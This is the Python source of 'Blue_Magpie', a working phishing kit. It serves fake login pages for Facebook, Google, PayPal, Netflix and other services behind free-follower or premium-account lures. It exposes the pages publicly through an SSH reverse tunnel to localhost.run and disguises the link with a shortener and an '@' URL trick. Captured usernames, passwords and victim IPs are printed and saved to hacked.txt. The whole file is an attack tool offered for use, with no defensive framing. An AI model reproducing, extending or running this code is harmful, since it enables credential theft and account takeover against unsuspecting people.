#!/usr/bin/env python3
import os
import sys
import subprocess
import platform
import urllib.request
import urllib.parse
import json
import time
import random
import shutil
import signal
import threading
import tempfile
import re
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socketserver
from pathlib import Path
try:
    import webbrowser
except ImportError:
    webbrowser = None
try:
    from colorama import init, Fore, Back, Style
    init()
    COLORS_AVAILABLE = True
except ImportError:
    COLORS_AVAILABLE = False

class Colors:
    def __init__(self):
        if COLORS_AVAILABLE:
            self.red = Fore.RED
            self.green = Fore.GREEN
            self.yellow = Fore.YELLOW
            self.blue = Fore.BLUE
            self.magenta = Fore.MAGENTA
            self.cyan = Fore.CYAN
            self.white = Fore.WHITE
            self.reset = Style.RESET_ALL
        else:
            self.red = '\033[31;1m'
            self.green = '\033[32;1m'
            self.yellow = '\033[33;1m'
            self.blue = '\033[34;1m'
            self.magenta = '\033[35;1m'
            self.cyan = '\033[36;1m'
            self.white = '\033[0;1m'
            self.reset = '\033[0m'

colors = Colors()
running = True
server_process = None
ssh_process = None

def signal_handler(sig, frame):
    global running, ssh_process
    running = False
    print(f"\n{colors.white}")
    print("Exiting Blue_Magpie...")
    
    # Terminate SSH process if it exists
    if ssh_process:
        try:
            ssh_process.terminate()
            print(f"{colors.yellow}SSH process terminated")
        except:
            pass
    
    time.sleep(2)
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def is_indian():
    try:
        with urllib.request.urlopen('http://ip-api.com/json/') as response:
            data = json.loads(response.read().decode())
            return data.get('country') == 'India'
    except:
        return False

def update_blue_magpie():
    try:
        print(f"{colors.cyan}Checking for updates...")
        try:
            with urllib.request.urlopen('https://raw.githubusercontent.com/kishwordulal1234/Blue_Magpie/master/version') as response:
                current_version = response.read().decode().strip()
            
            if current_version == "V3.0.0":
                print(f"{colors.green}Blue_Magpie is up to date!")
            else:
                print(f"{colors.cyan}New version available: {current_version}")
                print(f"{colors.yellow}Updating Blue_Magpie...")
                subprocess.run(['git', 'pull', 'https://github.com/kishwordulal1234/Blue_Magpie.git'])
        except urllib.error.HTTPError as e:
            if e.code == 404:
                print(f"{colors.yellow}Version file not found. Skipping update check.")
            else:
                print(f"{colors.red}Update check failed: {e}")
    except Exception as e:
        print(f"{colors.red}Update check failed: {e}")

def start_localhost_run_tunnel(local_port):
    global ssh_process
    
    # Check if SSH key exists
    ssh_key_path = os.path.expanduser('~/.ssh/id_rsa')
    if not os.path.exists(ssh_key_path):
        print(f"{colors.red}SSH key not found. Generating one...")
        subprocess.run(['ssh-keygen', '-t', 'rsa', '-f', ssh_key_path, '-N', ''])
    
    print(f"{colors.yellow}[*] {colors.white}Starting localhost.run tunnel...")
    print(f"{colors.yellow}[*] {colors.white}If prompted, enter your SSH key passphrase")
    
    # Start SSH tunnel in a way that allows interaction but also captures output
    cmd = ['ssh', '-R', f'80:localhost:{local_port}', 'localhost.run']
    
    # Use a different approach - let SSH run normally but monitor output in background
    import pty
    import select
    
    # Create a pseudo-terminal for interactive SSH
    master, slave = pty.openpty()
    ssh_process = subprocess.Popen(cmd, stdin=slave, stdout=slave, stderr=slave, universal_newlines=True)
    os.close(slave)
    
    tunnel_url = None
    qr_code = None
    found_url = False
    
    def read_output():
        nonlocal tunnel_url, found_url, qr_code
        
        while running and ssh_process.poll() is None:
            try:
                # Check if there's data to read
                ready, _, _ = select.select([master], [], [], 0.1)
                if ready:
                    try:
                        output = os.read(master, 1024).decode('utf-8', errors='ignore')
                        if output:
                            lines = output.split('\n')
                            for line in lines:
                                if line.strip():
                                    print(f"{colors.blue}[LOCALHOST.RUN] {colors.white}{line.strip()}")
                                    
                                    # Look for tunnel URL
                                    if not found_url and '.lhr.life' in line:
                                        # Pattern: "xxxxx.lhr.life tunneled with tls termination, https://xxxxx.lhr.life"
                                        url_match = re.search(r'https://[a-zA-Z0-9]+\.lhr\.life', line)
                                        if url_match:
                                            tunnel_url = url_match.group(0)
                                            found_url = True
                                            print(f"\n{colors.green}[✓] Tunnel URL: {colors.cyan}{tunnel_url}")
                                            print(f"{colors.green}[✓] Share this URL with your target!")
                                    
                                    # Look for QR code
                                    if 'QR:' in line or 'Open your tunnel address on your mobile' in line:
                                        qr_code = "Available"
                                        print(f"{colors.green}[✓] QR Code available for mobile access")
                    except OSError:
                        break
            except Exception as e:
                break
    
    # Start output reading in background thread
    output_thread = threading.Thread(target=read_output, daemon=True)
    output_thread.start()
    
    # Allow user interaction with SSH (for passphrase)
    try:
        while running and ssh_process.poll() is None:
            # Check for keyboard input and forward to SSH
            ready, _, _ = select.select([sys.stdin], [], [], 0.1)
            if ready:
                user_input = sys.stdin.readline()
                os.write(master, user_input.encode())
            time.sleep(0.1)
    except Exception as e:
        print(f"{colors.red}Error in SSH interaction: {e}")
    finally:
        try:
            os.close(master)
        except:
            pass
    
    return ssh_process, tunnel_url, qr_code

def check_credentials(site_name):
    userlog_path = os.path.join('.pweb', site_name, 'userlog.txt')
    
    while running:
        if os.path.exists(userlog_path):
            print(f"\n{colors.green}{'='*60}")
            print(f"{colors.green}{' CREDENTIALS CAPTURED ':=^60}")
            print(f"{colors.green}{'='*60}")
            
            with open(userlog_path, 'r') as f:
                credentials = f.read().strip()
                lines = credentials.split('\n')
                
                for line in lines:
                    if line.strip():
                        if 'Username:' in line:
                            # Fixed parsing - get everything after "Username:"
                            username = line.split('Username:', 1)[1].strip()
                            print(f"{colors.cyan}[+] {colors.yellow}Facebook Username: {colors.green}{username}")
                        elif 'Password:' in line:
                            # Fixed parsing - get everything after "Password:"
                            password = line.split('Password:', 1)[1].strip()
                            print(f"{colors.cyan}[+] {colors.yellow}Password: {colors.green}{password}")
                        elif 'IP:' in line:
                            ip = line.split('IP:', 1)[1].strip()
                            print(f"{colors.cyan}[+] {colors.blue}IP: {colors.white}{ip}")
                        elif 'Time:' in line:
                            time_str = line.split('Time:', 1)[1].strip()
                            print(f"{colors.cyan}[+] {colors.magenta}Time: {colors.white}{time_str}")
                        else:
                            print(f"{colors.cyan}[+] {colors.white}{line}")
            
            print(f"{colors.green}{'='*60}")
            
            with open('hacked.txt', 'a') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"Site: {site_name}\n")
                f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(credentials)
                f.write(f"\n{'='*60}\n")
            
            os.remove(userlog_path)
            
            print(f"{colors.yellow}[!] {colors.white}Credentials saved to hacked.txt")
            print(f"{colors.green}{'='*60}\n")
        
        time.sleep(1)

def mask_url(subdomain, domain, original_url):
    try:
        encoded_url = urllib.parse.quote(original_url)
        short_url = f"https://is.gd/create.php?format=simple&url={encoded_url}"
        
        with urllib.request.urlopen(short_url) as response:
            short_url = response.read().decode().strip()
        
        short = short_url.replace('https://', '')
        masked_url = f"https://{subdomain}.com-{domain}@{short}"
        
        print(f"{colors.red}[~] Mask url: {colors.green}{masked_url}")
        return masked_url
    
    except Exception as e:
        print(f"{colors.red}URL masking failed: {e}")
        return original_url

def start_php_server(site_path, port):
    try:
        cmd = ['php', '-S', f'127.0.0.1:{port}', '-t', site_path]
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return process
    except Exception as e:
        print(f"{colors.red}Failed to start PHP server: {e}")
        return None

def start_python_server(site_path, port):
    try:
        os.chdir(site_path)
        handler = SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", port), handler) as httpd:
            print(f"Python server started on port {port}")
            try:
                while running:
                    httpd.handle_request()
            except KeyboardInterrupt:
                pass
    except Exception as e:
        print(f"{colors.red}Failed to start Python server: {e}")

def start_localhost(site_name):
    global running
    
    site_path = os.path.join('.pweb', site_name)
    
    if not os.path.exists(site_path):
        os.makedirs(site_path, exist_ok=True)
    
    print()
    print(f"{colors.green}[{colors.red}~{colors.green}] {colors.white}Port selection")
    print()
    
    print(f"{colors.magenta}[{colors.white}01{colors.magenta}] {colors.red}Random")
    print(f"{colors.magenta}[{colors.white}02{colors.magenta}] {colors.red}Custom")
    print()
    
    choice = input(f"{colors.green}[{colors.red}~{colors.green}] {colors.white}Choose option: ")
    
    if choice in ['1', '01']:
        port = 8870 + random.randint(0, 9)
    elif choice in ['2', '02']:
        try:
            port = int(input(f"{colors.magenta}[{colors.white}-{colors.magenta}] {colors.red}Enter a port number: "))
        except ValueError:
            print(f"{colors.red}Invalid port number")
            return
    else:
        print()
        print(f"{colors.red}[{colors.yellow}!{colors.red}] {colors.magenta}Invalid option")
        return
    
    print()
    print(f"{colors.cyan}Starting local server...")
    time.sleep(2)
    print()
    print(f"{colors.red}[{colors.green}+{colors.red}] {colors.yellow}Localhost running on http://127.0.0.1:{port}")
    
    # Start credential checking in a separate thread
    cred_thread = threading.Thread(target=check_credentials, args=(site_name,))
    cred_thread.daemon = True
    cred_thread.start()
    
    # Try to start PHP server first, fallback to Python
    php_process = start_php_server(site_path, port)
    if php_process:
        print(f"{colors.green}PHP server started successfully!")
        server_process = php_process
    else:
        print(f"{colors.yellow}PHP not available, falling back to Python server")
        python_thread = threading.Thread(target=start_python_server, args=(site_path, port))
        python_thread.daemon = True
        python_thread.start()
    
    # Keep the script running
    try:
        while running:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

def setup_server(site_name):
    source_path = os.path.join('server', site_name)
    dest_path = os.path.join('.pweb', site_name)
    
    if os.path.exists(source_path):
        if os.path.exists(dest_path):
            shutil.rmtree(dest_path)
        shutil.copytree(source_path, dest_path)
    
    print()
    print(f"{colors.green}[{colors.yellow}+{colors.green}] {colors.white}Port forwarding")
    print()
    print(f"{colors.magenta}[{colors.white}01{colors.magenta}] {colors.red}Localhost (for developer)")
    print(f"{colors.magenta}[{colors.white}02{colors.magenta}] {colors.red}Localhost.run (for internet)")
    print()
    
    choice = input(f"{colors.yellow}[{colors.magenta}~{colors.yellow}] {colors.magenta}Choose an option: ")
    
    if choice in ['1', '01']:
        print()
        print(f"{colors.white}[{colors.red}+{colors.white}] {colors.green}Starting localhost")
        start_localhost(site_name)
    elif choice in ['2', '02']:
        print()
        print(f"{colors.white}[{colors.red}+{colors.white}] {colors.green}Starting localhost.run tunnel")
        
        # First start localhost
        site_path = os.path.join('.pweb', site_name)
        if not os.path.exists(site_path):
            os.makedirs(site_path, exist_ok=True)
        
        # Port selection
        print()
        print(f"{colors.green}[{colors.red}~{colors.green}] {colors.white}Port selection")
        print()
        
        print(f"{colors.magenta}[{colors.white}01{colors.magenta}] {colors.red}Random")
        print(f"{colors.magenta}[{colors.white}02{colors.magenta}] {colors.red}Custom")
        print()
        
        choice_port = input(f"{colors.green}[{colors.red}~{colors.green}] {colors.white}Choose option: ")
        
        if choice_port in ['1', '01']:
            port = 8870 + random.randint(0, 9)
        elif choice_port in ['2', '02']:
            try:
                port = int(input(f"{colors.magenta}[{colors.white}-{colors.magenta}] {colors.red}Enter a port number: "))
            except ValueError:
                print(f"{colors.red}Invalid port number")
                return
        else:
            print()
            print(f"{colors.red}[{colors.yellow}!{colors.red}] {colors.magenta}Invalid option")
            return
        
        print()
        print(f"{colors.cyan}Starting local server on port {port}...")
        
        # Start credential checking
        cred_thread = threading.Thread(target=check_credentials, args=(site_name,))
        cred_thread.daemon = True
        cred_thread.start()
        
        # Start PHP server
        php_process = start_php_server(site_path, port)
        if not php_process:
            print(f"{colors.red}Failed to start local server")
            return
        
        print(f"{colors.green}Local server started, establishing tunnel...")
        
        # Start localhost.run tunnel with the correct port
        tunnel_process, tunnel_url, qr_code = start_localhost_run_tunnel(port)
        
        # The SSH tunnel is now running interactively
        # Keep the credential monitoring active
        try:
            while running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    else:
        print()
        print(f"{colors.red}Invalid option.")

def about_me():
    print(f"{colors.green}[{colors.white}+{colors.green}] {colors.yellow}Hi there I am unknone hart, I am a gray hat hacker, currently I am studing in vs niketan collage ktm tinkune")
    print()
    print(f"{colors.green}[{colors.white}01{colors.green}] {colors.magenta}Youtube: https://www.youtube.com/@unknonehart9406")
    print(f"{colors.green}[{colors.white}02{colors.green}] {colors.magenta}Instagram: https://www.instagram.com/un1kn0n3_h4rt/")
    print(f"{colors.green}[{colors.white}03{colors.green}] {colors.magenta}Facebook: https://www.facebook.com/kishwor.dulal.19")
    
    choice = input("Choose option: ")
    
    if choice in ['01', '1'] and webbrowser:
        webbrowser.open('https://www.youtube.com/@unknonehart9406')
    elif choice in ['02', '2'] and webbrowser:
        webbrowser.open('https://www.instagram.com/un1kn0n3_h4rt/')
    elif choice in ['03', '3'] and webbrowser:
        webbrowser.open('https://www.facebook.com/kishwor.dulal.19')
    else:
        print("Invalid option or webbrowser not available")

def check_requirements():
    print(f"{colors.red}_______ {colors.magenta} checking for requirements {colors.red}_______")
    
    required_packages = ['requests', 'colorama']
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"{colors.green}+++++{colors.yellow}Installing {package}{colors.green}+++++")
            subprocess.run([sys.executable, '-m', 'pip', 'install', package])
    
    # Check for PHP
    try:
        subprocess.run(['php', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        print(f"{colors.green}PHP is available")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"{colors.yellow}PHP not found. Installing...")
        try:
            subprocess.run(['sudo', 'apt-get', 'install', 'php', '-y'])
        except:
            print(f"{colors.red}Failed to install PHP. Please install PHP manually.")
    
    # Check for SSH
    try:
        subprocess.run(['ssh', '-V'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        print(f"{colors.green}SSH is available")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"{colors.yellow}SSH not found. Installing...")
        try:
            subprocess.run(['sudo', 'apt-get', 'install', 'openssh-client', '-y'])
        except:
            print(f"{colors.red}Failed to install SSH. Please install SSH manually.")
    
    essential_commands = ['curl', 'unzip', 'wget']
    for cmd in essential_commands:
        try:
            subprocess.run([cmd, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{colors.green}+++++{colors.yellow}Installing {cmd}{colors.green}+++++")
            try:
                subprocess.run(['sudo', 'apt-get', 'install', cmd, '-y'])
            except:
                print(f"{colors.red}Failed to install {cmd}")

def typewriter(text):
    for char in text:
        print(f"{colors.red} {char}", end='', flush=True)
        time.sleep(0.1)
    print()

def banner():
    os.system('clear')
    
    print(f"{colors.blue}")
    print("""
$$$$$$$$ $$\\                            $$\\      $$\\                               $$\\           
$$  __$$\\$$ |                           $$$\\    $$$ |                              \\__|          
$$ |  $$ |$$ |$$\\   $$\\  $$$$$$\\         $$$$\\  $$$$ | $$$$$$\\   $$$$$$\\   $$$$$$\\  $$\\  $$$$$$\\  
$$$$$$$  |$$ |$$ |  $$ |$$  __$$\\        $$\\$$\\$$ $$ | \\____$$\\ $$  __$$\\ $$  __$$\\ $$ |$$  __$$\\ 
$$  __$$\\ $$ |$$ |  $$ |$$$$$$$$ |       $$ \\$$$  $$ | $$$$$$$ |$$ /  $$ |$$ /  $$ |$$ |$$$$$$$$ |
$$ |  $$ |$$ |$$ |  $$ |$$   ____|       $$ |\\$  /$$ |$$  __$$ |$$ |  $$ |$$ |  $$ |$$ |$$   ____|
$$$$$$$  |$$ |\\$$$$$$  |\\$$$$$$\\        $$ | \\_/ $$ |\\$$$$$$$ |\\$$$$$$$ |$$$$$$$  |$$ |\\$$$$$$\\ 
\\_______/ \\__| \\______/  \\_______|$$$$$$\\__|     \\__| \\_______| \\____$$ |$$  ____/ \\__| \\_______|
                                  \\______|                      $$\\   $$ |$$ |                    
                                                                \\$$$$$$  |$$ |                    
                                                                 \\______/ \\__|                    
""")

def setup_directories():
    if os.path.exists('.pweb'):
        shutil.rmtree('.pweb')
    os.makedirs('.pweb', exist_ok=True)

def main_menu():
    print(f"{colors.magenta}[{colors.green}01{colors.magenta}]{colors.white} Facebook     {colors.magenta}[{colors.green}11{colors.magenta}]{colors.white} Netflix")
    print(f"{colors.magenta}[{colors.green}02{colors.magenta}]{colors.white} Instagram    {colors.magenta}[{colors.green}12{colors.magenta}]{colors.white} Twitter")
    print(f"{colors.magenta}[{colors.green}03{colors.magenta}]{colors.white} Snapchat     {colors.magenta}[{colors.green}13{colors.magenta}]{colors.white} Dropbox")
    print(f"{colors.magenta}[{colors.green}04{colors.magenta}]{colors.white} Google       {colors.magenta}[{colors.green}14{colors.magenta}]{colors.white} ig follower")
    print(f"{colors.magenta}[{colors.green}05{colors.magenta}]{colors.white} Github       {colors.magenta}[{colors.green}15{colors.magenta}]{colors.white} Yandex")
    print(f"{colors.magenta}[{colors.green}06{colors.magenta}]{colors.white} Paypal       {colors.magenta}[{colors.green}16{colors.magenta}]{colors.white} Origin")
    print(f"{colors.magenta}[{colors.green}07{colors.magenta}]{colors.white} Spotify      {colors.magenta}[{colors.green}17{colors.magenta}]{colors.white} Ebay")
    print(f"{colors.magenta}[{colors.green}08{colors.magenta}]{colors.white} Microsoft    {colors.magenta}[{colors.green}18{colors.magenta}]{colors.white} Pinterest")
    print(f"{colors.magenta}[{colors.green}09{colors.magenta}]{colors.white} Linkedin     {colors.magenta}[{colors.green}19{colors.magenta}]{colors.white} Yahoo")
    print(f"{colors.magenta}[{colors.green}10{colors.magenta}]{colors.white} Adobe        {colors.magenta}[{colors.green}20{colors.magenta}]{colors.white} About me")
    print()
    
    choice = input(f"{colors.yellow}[{colors.magenta}~{colors.yellow}] {colors.red}Choose an option: ")
    
    sites = {
        '1': ('facebook', 'follower-free'),
        '2': ('instagram', 'free-follower'),
        '3': ('snapchat', 'new-friend'),
        '4': ('google', 'google-login'),
        '5': ('github', 'free-stars'),
        '6': ('paypal', 'paypal-login'),
        '7': ('spotify', 'free-premimum-account'),
        '8': ('microsoft', 'free-purchage-key'),
        '9': ('linkedin', 'new-job'),
        '10': ('adobe', 'adobe-account'),
        '11': ('netflix', 'premimum-account-free'),
        '12': ('twitter', 'free-follower'),
        '13': ('dropbox', 'download'),
        '14': ('ig_follower', 'free-follower-new'),
        '15': ('yandex', 'yandex-account'),
        '16': ('origin', 'login'),
        '17': ('ebay', 'free-account'),
        '18': ('pinterest', 'free-follower'),
        '19': ('yahoo', 'yahoo-account'),
        '20': ('about', None)
    }
    
    if choice in sites:
        site_name, mask_info = sites[choice]
        if choice == '20':
            about_me()
        else:
            print()
            print(f"{colors.white}[{colors.green}+{colors.white}] {colors.yellow}Starting {site_name} server")
            setup_server(site_name)
    else:
        print()
        print(f"{colors.white}[{colors.red}!{colors.white}] {colors.yellow}Invalid option")

def main():
    check_requirements()
    
    if not is_indian():
        update_blue_magpie()
    else:
        print(f"{colors.white}You are in India then update this script manually if required..")
    
    typewriter("Starting Blue_Magpie")
    
    banner()
    
    setup_directories()
    
    main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{colors.white}Exiting...")
        sys.exit(0)